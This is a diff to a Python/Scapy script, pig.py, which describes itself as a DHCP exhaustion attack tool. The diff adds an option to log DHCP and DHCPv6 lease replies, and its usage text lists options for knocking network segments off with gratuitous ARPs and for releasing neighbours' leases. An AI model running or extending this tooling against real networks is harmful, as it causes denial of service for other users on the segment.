@@ -4,7 +4,7 @@
 enhanced DHCP exhaustion attack plus.
 
 Usage:
-    pig.py [-h -v -6 -1 -s -f -t -a -i -o -x -y -z -g -r -n -c] <interface>
+    pig.py [-h -v -6 -1 -s -f -t -a -i -o -l -x -y -z -g -r -n -c ] <interface>
   
 Options:
     -h, --help                     <-- you are here :)
@@ -25,6 +25,7 @@ Options:
     -a, --show-arp                 ... detect/print arp who_has (off)
     -i, --show-icmp                ... detect/print icmps requests (off)
     -o, --show-options             ... print lease infos (off)
+    -l, --show-lease-confirm       ... detect/print dhcp replies (off)
     
     -g, --neighbors-attack-garp    ... knock off network segment using gratious arps (off)
     -r, --neighbors-attack-release ... release all neighbor ips (off)
@@ -90,6 +91,7 @@ conf.verb = False
 SHOW_ARP = False
 SHOW_ICMP = False
 SHOW_DHCPOPTIONS = False
+SHOW_LEASE_CONFIRM = False
 MODE_IPv6 = False
 MODE_FUZZ = False
 DO_GARP = False
@@ -137,14 +139,14 @@ THREAD_CNT = 1
 THREAD_POOL = []
 
 def checkArgs():
-    global SHOW_ARP ,SHOW_ICMP, SHOW_DHCPOPTIONS, TIMEOUT, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE, MAC_LIST, DO_COLOR,DO_v6_RC, VERBOSITY,THREAD_CNT
+    global SHOW_ARP ,SHOW_ICMP, SHOW_DHCPOPTIONS, TIMEOUT, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE, MAC_LIST, DO_COLOR,DO_v6_RC, VERBOSITY,THREAD_CNT,SHOW_LEASE_CONFIRM
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "haiox:y:z:6fgrns:c1v:t:", ["help","show-arp","show-icmp",
+        opts, args = getopt.getopt(sys.argv[1:], "haiolx:y:z:6fgrns:c1v:t:", ["help","show-arp","show-icmp",
                                                                       "show-options","timeout-threads=","timeout-dos=",
                                                                       "timeout-dhcprequest=", "neighbors-scan-arp",
                                                                       "neighbors-attack-release", "neighbors-attack-garp",
                                                                       "fuzz","ipv6","client-src=","color","v6-rapid-commit",
-                                                                      "verbosity=","threads="])
+                                                                      "verbosity=","threads=", "show-lease-confirm"])
     except getopt.GetoptError, err:
         # print help information and exit:
         print str(err) # will print something like "option -a not recognized"
@@ -160,6 +162,8 @@ def checkArgs():
             SHOW_ICMP = True
         elif o in ("-o", "--show-options"):
             SHOW_DHCPOPTIONS=True
+        elif o in ("-l", "--show-lease-confirm"):
+            SHOW_LEASE_CONFIRM=True
         elif o in ("-x", "--timeout-threads"):
             TIMEOUT['timer']=float(a)
         elif o in ("-y", "--timeout-dos"):
@@ -510,7 +514,7 @@ class sniff_dhcp(threading.Thread):
             if not MODE_FUZZ and self.dhcpcount==5: dhcpdos=True
           
     def detect_dhcp(self,pkt):
-        global dhcpsmac,dhcpsip,subnet,SHOW_ARP,SHOW_DHCPOPTIONS,SHOW_ICMP,DO_v6_RC,p_dhcp_advertise
+        global dhcpsmac,dhcpsip,subnet,SHOW_ARP,SHOW_DHCPOPTIONS,SHOW_ICMP,DO_v6_RC,p_dhcp_advertise, SHOW_LEASE_CONFIRM
         if MODE_IPv6:
             if DHCP6_Advertise in pkt:
                 self.dhcpcount=0
@@ -536,7 +540,12 @@ class sniff_dhcp(threading.Thread):
                         sendPacket(dhcp_req)
                         LOG(type="-->", message= "v6 REQUEST ACK IPv6[%s]\n"%myip)
 
-            elif ICMPv6ND_NS in pkt and ICMPv6NDOptSrcLLAddr in pkt and SHOW_ICMP:
+            elif SHOW_LEASE_CONFIRM and DHCP6_Reply in pkt :
+                myip=pkt[DHCP6OptIAAddress].addr
+                sip=repr(pkt[DHCP6OptServerId].duid.lladdr)
+                cip=repr(pkt[DHCP6OptClientId].duid.lladdr)
+                LOG(type="<-", message=("v6 DHCP REPLY FROM [%s] -> [%s] - LEASE: IPv6[%s]"%(sip,cip,myip)))
+            elif SHOW_ICMP and ICMPv6ND_NS in pkt and ICMPv6NDOptSrcLLAddr in pkt :
                 LOG(type="<-", message= "v6 ICMP REQUEST FROM [%s] -> [%s]"%(pkt[ICMPv6NDOptSrcLLAddr].lladdr,pkt[ICMPv6ND_NS].tgt)) 
         else:
             if DHCP in pkt:
@@ -575,6 +584,11 @@ class sniff_dhcp(threading.Thread):
                     dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
                     LOG(type="-->", message= "DHCP_Request "+myip)
                     sendPacket(dhcp_req)
+                elif SHOW_LEASE_CONFIRM and pkt[DHCP] and pkt[DHCP].options[0][1] == 5:
+                    myip=pkt[BOOTP].yiaddr
+                    sip=pkt[BOOTP].siaddr
+                    LOG(type="<-", message= "DHCP_ACK   " + pkt[Ether].src +"\t"+sip + " IP: "+myip+" for MAC=["+pkt[Ether].dst+"]")
+            
             elif ICMP in pkt:
                 if pkt[ICMP].type==8:
                     myip=pkt[IP].dst
@@ -586,11 +600,11 @@ class sniff_dhcp(threading.Thread):
                     #sendPacket(icmp_req)
                     #print "ICMP response from "+myip+" to "+mydst 
 
-            elif ARP in pkt:
+            elif SHOW_ARP and ARP in pkt:
                 if pkt[ARP].op ==1:        #op=1 who has, 2 is at
                     myip=pkt[ARP].pdst
                     mydst=pkt[ARP].psrc
-                    if SHOW_ARP: LOG(type="<-", message= "ARP_Request " + myip+" from "+mydst)
+                    LOG(type="<-", message= "ARP_Request " + myip+" from "+mydst)
                     #todo(tintinweb):answer arps?
 
 
